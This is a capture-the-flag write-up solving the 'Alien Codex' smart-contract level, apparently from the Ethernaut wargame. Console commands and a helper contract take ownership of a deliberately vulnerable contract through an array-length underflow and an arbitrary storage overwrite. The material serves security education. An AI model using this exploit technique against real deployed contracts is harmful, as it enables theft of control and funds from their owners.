# 19. Alien Codex
<sup>Difficulty 7/10</sup>

You've uncovered an Alien contract. Claim ownership to complete the level.

Things that might help:

- Understanding how array storage works
- Understanding [ABI specifications](https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html)
- Using a very `underhanded` approach

## Solution

To take the ownership we first investigate the ABI to see the available functions and variables.

```javascript
contract.abi
// (11) [{…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}]
// 0: {constant: false, inputs: Array(2), name: 'revise', outputs: Array(0), payable: false, …}
// 1: {constant: true, inputs: Array(0), name: 'contact', outputs: Array(1), payable: false, …}
// 2: {constant: false, inputs: Array(0), name: 'retract', outputs: Array(0), payable: false, …}
// 3: {constant: false, inputs: Array(0), name: 'make_contact', outputs: Array(0), payable: false, …}
// 4: {constant: false, inputs: Array(0), name: 'renounceOwnership', outputs: Array(0), payable: false, …}
// 5: {constant: true, inputs: Array(0), name: 'owner', outputs: Array(1), payable: false, …}
// 6: {constant: true, inputs: Array(0), name: 'isOwner', outputs: Array(1), payable: false, …}
// 7: {constant: true, inputs: Array(1), name: 'codex', outputs: Array(1), payable: false, …}
// 8: {constant: false, inputs: Array(1), name: 'record', outputs: Array(0), payable: false, …}
// 9: {constant: false, inputs: Array(1), name: 'transferOwnership', outputs: Array(0), payable: false, …}
// 10: {anonymous: false, inputs: Array(2), name: 'OwnershipTransferred', type: 'event', constant: undefined, …}
// length: 11
```

Cannot use `renounceOwnership` or `transferOwnership` due to `Ownable` checks... that would've been too easy :D

```javascript
await contract.transferOwnership(player)
// Ownable: caller is not the owner
await contract.renounceOwnership()
// Ownable: caller is not the owner
```

Looking somewhere else we notice that we can mess around with the storage via the `codex` variable.
If we call it directly, we get an error because our index is greater than its length. 

```javascript
await contract.codex(0)
// invalid opcode: INVALID
```

But via the `retract` function we can exploit the integer underflow and have `codex` variable cover all the EVM storage spaces, from `0` to `2 ** 256 - 1`.

```solidity
function retract() contacted public {
	codex.length--;
}
```

To effectively exploit this behavior we need to find out where the `owner` variable is located, in order to overwrite it via the `revise` function.

```solidity
function revise(uint i, bytes32 _content) contacted public {
	codex[i] = _content;
}
```

The `owner` variable is located at slot `0` since bool takes only 1 byte and address takes 20 bytes. As we learned earlier, challenge [12. Privacy](./12_privacy.md), the EVM tries to optimize the storage to fit a 32 bytes slot. Hence, `codex` list will start at slot `1`.

| Index | Variables        | Notes                               |
|:------|:-----------------|:------------------------------------|
| 0     | contacted, owner | 1 byte + 20 bytes                   |
| 1     | codex[0]         | This takes the whole 32 bytes space |

We can verify this:

```javascript
await web3.eth.getStorageAt(contract.address, 0)
// -> '0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272'
await contract.contact()
// -> false
```

We have to take the last `1 bool + 1 address = 21 bytes` (41 characters), the trailing `0`s are only a padding.
Then we'll have:

| Contact | Owner                                      |
|:--------|:-------------------------------------------|
| `0`     | `da5b3fb76c78b6edee6be8f11a1c31ecfb02b272` |

By contacting the aliens via the `make_contact` method (this operation is required since the functions we'll use later need `contact` to be `true`) we can see the change:

```javascript
await contract.make_contact()
await contract.contact()
// -> true
await web3.eth.getStorageAt(contract.address, 0)
// -> '0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272'
```

| Contact | Owner                                      |
|:--------|:-------------------------------------------|
| `1`     | `da5b3fb76c78b6edee6be8f11a1c31ecfb02b272` |


Now that we got all these information, we need to find the address which contains the `owner` variable and overwrite it!
`codex` will be at `keccak256(abi.encodePacked(bytes32(uint256(1))))`, while the index of the `owner` should be `2 ** 256 - <codex_index>`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract Alien {
    uint public ownerIndex;
    function getIndex() public returns (uint) {
        uint codexIndex = uint(keccak256(abi.encodePacked(bytes32(uint256(1)))));
        ownerIndex = uint(2 ** 256 - 1) - codexIndex + 1;
        return ownerIndex;
    }
}
```

Returned value:
`35707666377435648211887908874984608119992236509074197713628505308453184860938`

Now we can manipulate the owner!

```javascript
await contract.owner() == player                                                // Check we are note owner
// -> false
const playerMemory = '0x' + player.slice(2).padStart(64, '0')                   // Reconstruct the owner variable with player
// -> '0x000000000000000000000000aB75624dB2FDC51bFc0b4EB56902811a0Aa844b3'
await contract.make_contact()                                                   // Make the contact to use the other functions
await contract.contact()                   
// -> true
await contract.codex(0)                                                         // This will throw an error since we haven't already trigger the underflow
// [!] Error: invalid opcode: INVALID  
await contract.retract()                                                        // Trigger the underflow 
await contract.codex(0)
// -> '0x0000000000000000000000000000000000000000000000000000000000000000'
const ownerMemoryAddr = '35707666377435648211887908874984608119992236509074197713628505308453184860938'
await contract.codex(ownerMemoryAddr)                                           // Check the memory address we found
// -> '0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272'
await contract.revise(ownerMemoryAddr, playerMemory)                            // Overwrite it
await contract.codex(ownerMemoryAddr)
// -> '0x000000000000000000000000ab75624db2fdc51bfc0b4eb56902811a0aa844b3'
```

We succed it! Let's do final checks: we expect we are the owner, also, we remove the contact since we didn't add the `1` before the player address.

```javascript
await contract.contact() 
// -> false
await contract.owner() == player
// -> true
```

```
╚(▲_▲)╝ Well done, You have completed this level!!!
```

## OZ Corner

This level exploits the fact that the EVM doesn't validate an array's ABI-encoded length vs its actual payload.

Additionally, it exploits the arithmetic underflow of array length, by expanding the array's bounds to the entire storage area of `2^256`. The user is then able to modify all contract storage.

Both vulnerabilities are inspired by 2017's [Underhanded coding contest](https://medium.com/@weka/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079)
